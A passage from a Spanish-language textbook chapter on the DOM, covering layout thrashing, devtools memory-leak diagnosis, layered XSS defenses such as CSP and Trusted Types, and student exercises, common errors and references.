// Mal: cada vuelta escribe y después lee, forzando un recálculo
for (const tarjeta of tarjetas) {
  tarjeta.style.width = "300px";
  console.log(tarjeta.offsetHeight);   // fuerza el recálculo acá mismo
}

// Bien: primero todas las escrituras, después todas las lecturas
for (const tarjeta of tarjetas) tarjeta.style.width = "300px";
const alturas = tarjetas.map(t => t.offsetHeight);   // un solo recálculo
```

Con cien elementos la diferencia es de dos órdenes de magnitud, y el síntoma es
exactamente el bloqueo del hilo que el Capítulo 3 describió: la página deja de
responder.

Las tres estrategias que resuelven la mayoría de los casos: **agrupar las
inserciones** con `DocumentFragment` (sección 4.6.1), **separar lecturas de
escrituras** como en el ejemplo, y **cambiar clases en lugar de estilos
individuales**, porque una sola modificación de `classList` reemplaza varias
escrituras de `style`.

> **⚠️ OJO ACÁ**
> Este problema tiene nombre propio en inglés —*layout thrashing*— y es traicionero
> por una razón: **el código se ve perfectamente razonable.**
>
> Leer una medida y después usarla es lo más natural del mundo. Nadie sospecha que
> `tarjeta.offsetHeight` sea caro: parece que estuvieras leyendo una propiedad de un
> objeto, como cualquier otra.
>
> Pero no estás leyendo una propiedad guardada: **estás pidiendo un cálculo que
> obliga al navegador a resolver todo lo que tenía pendiente**, ahí mismo, antes de
> poder contestarte.
>
> La lista de propiedades que disparan esto es larga y conviene tenerla a mano:
> `offsetWidth`, `offsetHeight`, `offsetTop`, `offsetLeft`, `clientWidth`,
> `clientHeight`, `scrollTop`, `scrollHeight`, `getBoundingClientRect()`,
> `getComputedStyle()` y el `innerText` de la sección 4.6.2.
>
> **Regla: primero escribís todo, después leés todo.** Nunca alternes dentro de un
> bucle.

---

## 4.11. Herramientas de diagnóstico

El **panel de elementos** muestra el DOM actual, no el HTML original (sección 4.3).
Permite editar nodos en vivo, lo que sirve para probar una corrección antes de
escribirla en el código.

Dentro de ese panel, la pestaña de **escuchas de eventos** enumera **todos los
manejadores registrados en el elemento seleccionado y en sus ancestros**. Es la
herramienta directa para diagnosticar la sección 4.9: si al desmontar y volver a
montar una vista el número de manejadores crece, hay una baja faltante.

*(Ver Figura 4.6: el panel de escuchas de eventos.)*

En la **consola**, cuatro utilidades específicas del DOM:

```js
$0                              // el elemento seleccionado en el inspector
$$("selector")                  // atajo de querySelectorAll
getEventListeners($0)           // los manejadores registrados
monitorEvents($0, "click")      // registra en consola cada evento del tipo dado
```

El **panel de memoria** es el que confirma una fuga. El procedimiento tiene cuatro
pasos y conviene seguirlo tal cual:

1. Tomar una instantánea del montón de memoria.
2. Montar y desmontar la vista sospechosa varias veces.
3. Forzar la recolección de basura y tomar una segunda instantánea.
4. Comparar y filtrar por **nodos separados**.

Si aparecen nodos separados que deberían haberse liberado, hay una referencia viva.
El panel muestra **la cadena de retención**, es decir qué está manteniendo vivo a
ese nodo, y ahí aparece el manejador que nadie dio de baja.

*(Ver Figura 4.5: nodos separados y su cadena de retención.)*

> **🧪 EXPERIMENTO**
> Comprobá la fuga de la sección 4.9 con tus propias manos. Es el experimento más
> útil del capítulo.
>
> 1. Escribí una función que cree un `div`, le registre un manejador de `click` en
>    `document` y devuelva una función que sólo haga `div.remove()`.
> 2. Llamala **cincuenta veces** desde la consola, guardando las funciones de
>    desmontaje.
> 3. Ejecutá las cincuenta funciones de desmontaje. **La pantalla queda limpia.**
> 4. Ahora abrí el panel de memoria, forzá la recolección, tomá una instantánea y
>    filtrá por nodos separados.
>
> Los cincuenta `div` siguen ahí. No se ven, no están en el documento, y ocupan
> memoria.
>
> 5. Hacé clic en cualquier lado de la página y mirá la consola: **los cincuenta
>    manejadores se ejecutan.**
>
> Eso es exactamente lo que hace RN-F01 obligatoria. Y fijate en el detalle más
> importante: **en el paso 3 la pantalla se veía perfecta.** Ninguna fuga se ve
> mirando la pantalla.

---

## 4.12. Seguridad y evolución

La defensa contra la inyección de la sección 4.7 tiene dos capas, y conviene
entender por qué hacen falta las dos.

La primera es **el código**: `textContent` y `createElement` por defecto, DOMPurify
cuando el HTML es un requisito. Es la regla RN-F02.

La segunda es el encabezado **`Content-Security-Policy`** de la sección 16.5 del
TPI, que declara al navegador de qué orígenes se admite ejecutar scripts. Una
política que prohíbe los manejadores en línea neutraliza el ataque del ejemplo
**aunque el código tenga el error**. Esa es su razón de ser: **actúa cuando la
primera capa falló**, y la primera capa falla tarde o temprano.

La plataforma incorporó además tres mecanismos que conviene conocer:

Los **tipos de confianza** (*Trusted Types*) permiten configurar el navegador para
que rechace asignaciones directas a `innerHTML`, obligando a que todo contenido pase
por una función de saneamiento declarada. Convierte la regla RN-F02 en algo que el
navegador impone en lugar de algo que hay que recordar.

`Element.setHTML()`, en proceso de estandarización, incorpora el saneamiento a la
propia plataforma, con la intención de que a futuro no haga falta una biblioteca.

El **DOM en la sombra** (*Shadow DOM*) crea subárboles aislados, con estilos que no
escapan ni entran. Es la base de los componentes web del Capítulo 7.

Vale una última precisión sobre la evolución del DOM, porque cierra el arco de la
sección 4.2. La interfaz que hoy ofrece la plataforma —`querySelector`,
`classList`, `dataset`, `closest`, `append`, `AbortController`— **es sustancialmente
mejor que la que motivó a jQuery**. El TPI puede prohibir el framework porque la
interfaz nativa ya alcanza, cosa que en 2006 no era cierta.

---

## 4.13. Verificación

1. Comparar el HTML original con el DOM actual en una página con contenido dinámico
   y **explicar cada diferencia**.
2. Contar los nodos hijos de una lista con indentación y explicar por qué el número
   no coincide con la cantidad de elementos.
3. Reproducir el bug de la colección viva de la sección 4.5.2 y corregirlo.
4. Insertar un dato que contenga marcado con `textContent` y con `innerHTML`, y
   **documentar la diferencia observable**.
5. Reproducir el ataque de la sección 4.7.2 en una página propia y neutralizarlo de
   las dos formas que admite el TPI.
6. Registrar manejadores en las tres fases sobre elementos anidados y **predecir el
   orden** en que se ejecutan antes de comprobarlo.
7. Implementar una lista con delegación y verificar en el panel de escuchas que hay
   **un solo manejador** registrado.
8. Provocar la fuga de la sección 4.9.2, confirmarla en el panel de memoria y
   corregirla con `AbortController`.
9. Medir con el panel de rendimiento la diferencia entre insertar cien elementos uno
   por uno y hacerlo con `DocumentFragment`.

---

## 4.14. Errores frecuentes

**Buscar un elemento antes de que exista.** `querySelector` devuelve `null` y el
error aparece después, con un mensaje que no menciona el selector. Suele resolverse
usando módulos, que se ejecutan tras el parseo (secciones 3.3 y 4.5.1).

**Recorrer una colección viva mientras se la modifica.** Se saltean elementos y el
bucle termina antes. No falla: funciona a medias (sección 4.5.2).

**Usar `innerHTML` con datos que no generó el propio código.** Es la vulnerabilidad
de la sección 4.7 y viola RN-F02.

**Filtrar `<script>` y creer que alcanza.** `innerHTML` ni siquiera ejecuta
`<script>`; el vector real son los manejadores en línea como `onerror` (sección
4.7.3).

**Leer `getAttribute("value")` esperando el valor actual.** Devuelve el valor
inicial del marcado. El estado actual está en la propiedad (sección 4.6.3).

**Olvidar que `dataset` devuelve cadenas.** Un identificador numérico usado sin
convertir produce comparaciones que fallan (sección 4.6.3).

**Registrar un manejador anónimo y pretender darlo de baja.**
`removeEventListener` exige la misma referencia; dos flechas idénticas son dos
funciones distintas (sección 4.9.3).

**Desmontar quitando el nodo pero sin dar de baja las suscripciones.** Produce la
fuga de la sección 4.9.2 y viola RN-F01.

**Usar `stopPropagation()` por precaución.** Rompe la delegación de manejadores
registrados más arriba, incluso de los que se agreguen después (sección 4.8.4).

**Alternar escrituras y lecturas de geometría en un bucle.** Fuerza un recálculo por
vuelta y bloquea el hilo (sección 4.10).

**Usar `innerText` para leer texto.** Depende del estilo y fuerza un recálculo;
`textContent` es más barato (sección 4.6.2).

---

## 4.15. Actividades

1. **Árbol real.** Dado un fragmento de marcado con indentación y comentarios,
   dibujar el árbol de nodos completo —incluidos los de texto— y verificarlo en la
   consola contando `childNodes` y `children`.

2. **Catálogo sin `innerHTML`.** Construir la vista de un catálogo de productos que
   inserte veinte tarjetas con `createElement` y `textContent`, usando
   `DocumentFragment`. Medir el tiempo con `console.time()` y compararlo con una
   versión que inserte una por una.

3. **El ataque y sus dos defensas.** Reproducir el XSS de la sección 4.7.2 en una
   página local, verificar que la petición sale usando el panel de red, y
   neutralizarlo primero con `textContent` y después con DOMPurify. Documentar en
   qué caso cada solución es la adecuada.

4. **Delegación en el carrito.** Implementar un carrito donde cada ítem tiene botones
   de sumar, restar y quitar, con **un solo manejador** en el contenedor. Verificar
   en el panel de escuchas que efectivamente hay uno, y comprobar que funciona con
   ítems agregados después de registrarlo.

5. **Ciclo de vida completo.** Escribir una función de montaje que registre tres
   suscripciones distintas y devuelva una función de desmontaje con
   `AbortController`. Demostrar con el panel de memoria que tras desmontar no quedan
   nodos separados.

6. **Exploración: el costo del recálculo.** Escribir dos versiones de una función que
   ajuste el alto de cien tarjetas al de la más alta: una alternando lecturas y
   escrituras, otra separándolas. Grabar ambas con el panel de rendimiento y
   documentar la diferencia. Relacionar lo observado con la sección 4.10 y con el
   modelo de hilo único de la sección 3.10.1. *(Requiere el panel de rendimiento.)*

7. **Exploración: qué quedó de jQuery.** Tomar cinco operaciones habituales de jQuery
   —selección, clases, eventos, recorrido de ancestros, petición de red— y escribir
   el equivalente con la interfaz nativa actual. Para cada una, indicar en qué año se
   incorporó la alternativa nativa. Relacionar lo observado con la afirmación de la
   sección 4.2 sobre por qué jQuery dejó de ser necesaria.

---

## 4.16. Síntesis

1. El DOM nació de la incompatibilidad entre modelos rivales, y se especificó
   **independiente del lenguaje**. Esa neutralidad —no un descuido— explica por qué
   su interfaz es verbosa.

2. El **modelo de eventos con dos fases es un compromiso político**: el W3C adoptó a
   la vez la captura de Netscape y el burbujeo de Microsoft. El tercer parámetro de
   `addEventListener` existe por eso.

3. jQuery no fue reemplazada por algo mejor: **el problema que resolvía dejó de
   existir**. Reconocer eso exige conocer el problema, y es la razón de fondo por la
   que el TPI prohíbe el framework.

4. **El DOM no es el HTML.** Es un árbol vivo en memoria; el HTML es el texto que
   llegó. Serializar el DOM no devuelve el original: devuelve el árbol actual, con
   los errores de marcado ya corregidos.

5. Las colecciones **vivas** se actualizan mientras se las recorre, y ese es el
   origen de un bug que no falla sino que **funciona a medias**. `querySelectorAll`
   devuelve una lista estática y es la opción por defecto.

6. **Atributo y propiedad no son lo mismo**: el atributo conserva el valor inicial
   del marcado, la propiedad refleja el estado actual.

7. Asignar a `innerHTML` **parsea el texto como marcado**, y ahí nace el XSS. Filtrar
   `<script>` no sirve: el vector real son los manejadores en línea. De ahí sale
   RN-F02, y no se escribe un sanitizador propio.

8. **La delegación es la opción por defecto**: menos manejadores, funciona con
   elementos futuros y se da de baja de una sola vez.

9. Un manejador **es una clausura**, y una clausura mantiene vivo lo que referencia.
   Quitar un nodo de la pantalla **no lo libera** si algo lo sigue referenciando.
   De ahí sale RN-F01, y `AbortController` es la forma limpia de cumplirla.

10. **Ninguna fuga de memoria se ve mirando la pantalla.** Se ve en el panel de
    memoria, filtrando por nodos separados y leyendo la cadena de retención.

11. Leer una propiedad de geometría **fuerza un recálculo inmediato**. Alternar
    lecturas y escrituras en un bucle bloquea el hilo, que es el mismo problema del
    Capítulo 3 con otra causa.

---

## 4.17. Referencias y lecturas complementarias

La fuente normativa es el **DOM Living Standard** del WHATWG, en `dom.spec.whatwg.org`,
que reemplazó a los niveles del W3C y define los tipos de nodo de la sección 4.4, el
despacho de eventos de la sección 4.8 y el `AbortController` de la sección 4.9.4. Las
interfaces específicas de los elementos HTML —`dataset`, `classList`, `innerHTML`—
están en el **HTML Living Standard**, cuya sección sobre el algoritmo de análisis de
fragmentos documenta el comportamiento de `innerHTML` descrito en la sección 4.7.3,
incluida la exclusión de las etiquetas `<script>`. Los niveles históricos del W3C
—**DOM Level 1** (1998), **Level 2 Events** (2000), que introdujo el modelo de dos
fases, y **Level 3** (2004)— siguen siendo útiles para entender el origen de las
decisiones de la sección 4.2. El encabezado `Content-Security-Policy` citado en la
sección 4.12 está normado en **CSP Level 3** del W3C, y la propuesta de **Trusted
Types** se sigue en el repositorio del WICG.

Como bibliografía y material de referencia, la documentación de MDN en
`developer.mozilla.org` es la fuente de consulta cotidiana para cada método de este
capítulo y conviene adoptarla por encima de resultados de buscador. Sobre inyección
de código, la **OWASP Cross Site Scripting Prevention Cheat Sheet** documenta los
vectores de la sección 4.7.3 con mucho más detalle del que cabe acá, y explica por
qué el filtrado por lista negra no funciona; la documentación del proyecto
**DOMPurify**, en su repositorio público, detalla qué sanea y qué no. Para el costo
de las operaciones de la sección 4.10, Osmani, *Rendering on the Web* y la sección
de rendimiento de `web.dev` explican el recálculo de disposición y las estrategias
para evitarlo. Y sobre el ciclo de vida y las fugas, la guía de análisis de memoria
de Chrome DevTools documenta el procedimiento de instantáneas y la lectura de
cadenas de retención de la sección 4.11.

---

**Continúa en:** Capítulo 5 — Asincronía y red: promesas, `fetch`, errores y eventos
del servidor, donde el `AbortController` de la sección 4.9.4 vuelve para cancelar
peticiones, y donde el catálogo de errores de la sección 14.1 del TPI encuentra su
lugar en el código.
